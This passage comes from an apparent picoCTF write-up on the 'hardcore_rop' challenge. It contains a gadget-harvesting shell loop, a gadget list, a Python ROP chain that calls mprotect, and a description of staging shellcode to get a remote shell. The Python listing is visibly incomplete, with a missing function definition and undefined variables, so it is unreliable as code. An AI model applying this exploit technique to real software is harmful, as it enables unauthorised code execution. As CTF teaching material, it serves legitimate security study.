    (echo $i; echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB") | ./hardcore_rop `pwd`
    dd if=core of=region bs=1 skip=4096 count=40960
    xxd -c 1 region | awk {'print $1 $2'} |sort -r &gt; dump.txt
    python ./ropgadget.py -i bleh -d 10 &gt; $i-gadgets.txt

    cat $i-gadgets.txt |egrep 'int 0x80'
    rm core
    rm dump.txt
done &lt; digits.txt
</code></pre>

<p>This script does the following: it runs the program and sends a seed value for the ROP gadget generation. Then, it crashes the program. From the coredump, it extracts the region at <code>0xf000000</code> and proceeds to dump all these bytes into a textfile. Finally, my custom <a href="https://gist.github.com/barrebas/4fc86eaf0e9b124813a3">ropgadget.py</a> searcher extracts all the ROP gadgets. It is slightly modified to work with this setup. I let this script run for a few hours. After a while, I ran</p>

<pre><code class="bash">bas@tritonal:~/tmp/picoctf/hardcorrop$ grep "int 0x80" *
0347-gadgets.txt:RET: 0x0000d64: int 0x80; lahf; ret; 
</code></pre>

<p>It found an <code>int 0x80</code> gadget! Luckily, the opcode <code>lahf</code> is harmless: it just load the FLAGS into <code>ah</code>. No big deal! With this useable gadget, a ROP chain could be built that calls <code>mprotect</code> to set the region at <code>0xf000000</code> to writeable. After this stage 1, a second stage would read the shellcode. First things first, let&rsquo;s find gadgets that allow us to control registers. The easiest would be a <code>pop r32; ret</code>. Luckily, these sequences are very likely to occur. I found everything I needed in the list of gadgets:</p>

<pre><code># RET: 0x000913f: pop eax; ret;
# RET: 0x0003c7e: pop ecx; ret;
# RET: 0x0002393: pop edx; ret;
# RET: 0x000964d: pop ebx; ret;
# RET: 0x0000d64: int 0x80; lahf; ret;
</code></pre>

<p>I wrote the following ROP chain:</p>

<pre><code class="python">#!/usr/bin/python

import struct

BASE = 0xf000000
# RET: 0x000913f: pop eax; ret;
popeax = 0x000913f

int03h = 0x0001b11

    return struct.pack("&lt;L", x)

payload = ""

payload += p(7)

# length in ecx, needs to be multiple of 2
payload += p(BASE + popecx)
payload += p(0x1000)

# call syscall int 0x80
payload += p(BASE + int80h)

# stage2 test
# edi = 0xf000000
payload += p(BASE + popedi)
payload += p(BASE)
# edx = 0xcccccccc (four times int 0x3)
payload += p(BASE + popedx)
payload += p(0xcccccccc)
# RET: 0x0002770: mov [edi], dh; ret
payload += p(BASE + 0x0002770)
# return to 0xf000000, which should contain an int 0x3
payload += p(BASE + popedx + 1)
payload += p(BASE)

print payload

</code></pre>

<p>After running this first POC, the binary indeed crashed with a SIGTRAP error! Inspection of the core dump with <code>gdb</code> showed that the first byte of <code>0xf000000</code> was a <code>0xcc</code>, so this worked!</p>

<p>Writing the shellcode one byte at a time seemed tedious. Furthermore, the ROP chain has a maximum of 555 bytes, so a more flexible way was to use <code>syscall_read</code>. This will allow us to read in arbitrary shellcode. All the necessary gadgets were present:</p>

<p>Now, this was used with <a href="http://shell-storm.org/shellcode/files/shellcode-547.php">a slightly modified shellcode</a>. This shellcode uses <code>execve</code> to run <code>/bin/ash</code>; I changed it to run <code>/bin//sh</code>. The shellcode has to be supplied seperately on the command line; I could not get the exploit to work if the shellcode was printed from <code>ropsploit.py</code>. The following landed us a shell on the remote server (again, using <code>cat</code> to keep the shell alive):</p>
